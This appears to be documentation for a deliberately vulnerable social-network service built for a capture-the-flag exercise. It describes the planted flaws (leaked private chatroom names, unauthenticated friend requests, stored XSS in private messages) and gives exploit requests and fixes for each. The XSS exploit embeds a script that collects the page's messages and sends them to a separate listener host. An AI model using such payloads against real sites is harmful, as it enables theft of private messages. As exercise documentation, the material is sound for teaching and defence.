Service documentation
======================
# Service Structure
asocialnetwork is a javascript service that uses the following technologies:
- Node.js
- Express
- MongoDB
- Mongoose
- EJS
- Bootstrap
- jQuery
- NGINX

![Service Structure](Service%20Structure.svg)
# Functionality
- Chatrooms
- Private Messages
- Friend Requests
- Profiles
- Posts
# Vulnerabilities
## Access to private chatrooms
### Hashing of chatroom names
- Category: Misconfiguration
- Difficulty: Easy

Profiles list all chatrooms a user is a member of. This includes private chatrooms. Using the name of the chatroom, it is possible to join the chatroom.
### Friend requests
- Category: Authorization
- Difficulty: Easy

Friend requests can be sent or accepted by anyone. This allows anyone to view any profile and see which chatrooms they are a member of.
### Exploit
    post http://localhost:3000/friends/requests body: {"userName":"foo", "partner":"bar", "status": "send"}
    post http://localhost:3000/friends/requests body: {"userName":"foo", "partner":"bar", "status": "accept"}
    get http://localhost:3000/profile/foo
    get http://localhost:3000/chatrooms/secret
### Fix
Add check that the user sending the request is the same as the userName in the request body. And check that the user accepting the request is the same as the partner in the request body.
## Cross-Site Scripting (XSS)

- Category: XSS
- Difficulty: Medium

The new private message popup is vulnerable to XSS. The message is not sanitized and can be used to execute arbitrary JavaScript code.
### Exploit
    post http://localhost:3000/messages body: {"recipient":"foo", "message":"<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:6452/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"}
### Fix
Sanitize the message before displaying it.


